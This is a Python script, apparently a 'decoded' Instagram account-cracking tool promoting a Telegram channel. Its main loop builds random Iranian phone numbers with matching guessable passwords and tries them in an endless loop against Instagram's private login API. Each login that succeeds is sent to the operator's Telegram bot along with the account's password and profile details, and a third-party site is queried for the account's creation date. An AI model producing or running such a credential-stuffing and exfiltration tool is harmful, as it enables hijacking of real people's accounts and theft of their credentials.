# encoding: utf-8
# Decoded by HackerModePro tool...
# Copyright: PSH-TEAM
# Follow us on telegram ( @BMW_5T )
import os, sys, requests
import webbrowser
webbrowser.open('https://t.me/BMW_5T')
os.system('clear')
Z = '\x1b[1;31m'
A = '\x1b[1;33m'
Z1 = '\x1b[2;31m'
F = '\x1b[2;32m'
X = '\x1b[2;34m'
C = '\x1b[2;35m'
S = '\x1b[2;36m'
Y = '\x1b[1;34m'
try:
    import os
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
except ImportError:
    os.system('pip install time')
    os.system('pip install webbrowser ')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('pip install sys')
    os.system('clear')
    from time import sleep
    import time, webbrowser, random, requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
else:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
    os.system('clear')
    aa = 0
    zz = 0
    import time
    timee = time.asctime()
    t = time.localtime()
    current_time = time.strftime('%H:%R:% EO', t)

    def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
            sleep(0.1)


print(A + 'ڪكيد برو ')
print('ــــٓـ★ـــــٓــــــٓــــ√ـ√ـٓــــــٓــــــٓــــــٓ√ــــــٓــ√√ــــٓ√ـــــ√ـٓــ★ـ√ـــٓــــــٓــ')
ID = input(Z + 'ايــــٓــدي :')
tok = input(Z + 'تــــٓــوڪـــن :')

def code_joo(userQ, password):
    cookie = secrets.token_hex(8) * 2
    head = {'HOST':'www.instagram.com',  'KeepAlive':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
     'Cookie':cookie, 
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'missing', 
     'X-CSRFToken':'missing', 
     'Accept-Language':'en-US,en;q=0.9'}
    url_id = f"https://www.instagram.com/{userQ}/?__a=1"
    req_id = requests.get(url_id, headers=head).json()
    name = str(req_id['graphql']['user']['full_name'])
    id = str(req_id['graphql']['user']['id'])
    followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
    following = str(req_id['graphql']['user']['edge_follow']['count'])
    re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
    ree = re.json()
    dat = ree['data']
    t = time.localtime()
    current_time = time.strftime('%H:%E:%RO', t)
    joo3 = f"🧚‍♂️ڪكيد صادلك  ✅︎\n◆━━━━━━◆❃◆━━━━━━◆\n =✅CODNUM: {username}\n =✅PASS : {password}\n =✅USER: {userQ}\n =: FOLLOWES✅ {followes}\n =✅DATE: {dat}\n◆━━━━━━◆❃◆━━━━━━◆\nCH @BMW_5T   "
    tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {joo3} \n"
    i = requests.post(tlg)


url = 'https://b.i.instagram.com/api/v1/accounts/login/'
headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
sleep(1)
sleep(0)
user = '0987654321'
while True:
    us = str(''.join((random.choice(user) for i in range(7))))
    username = '+98938' + us
    password = '0938' + us
    from uuid import uuid4
    uid = str(uuid4())
    data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
    req = requests.post(url, headers=headers, data=data)
    if 'logged_in_user' in req.json():
        zz += 1
        userQ = req.json()['logged_in_user']['username']
        code_joo(userQ, password)
    elif '"message":"challenge_required","challenge"' in req.json():
        os.system('cls' if os.name == 'nt' else 'clear')
        print((Z1 + f"\r                 \n [=] Hit : {zz} \n [=] Bad : {aa} \n [=] Scure :  \n [=] Block : \n يوزر : {username} \n باسورد : {password} "), end='')
    else:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Z1 + 'آنتضـر آلصـيد 🔥')
        print((F+ f"\r\آلحسـآبآت: {zz} \آلفحص: {aa}\آلرقم: {username} \آلبسـورد: {password} "), end='')
        aa += 1
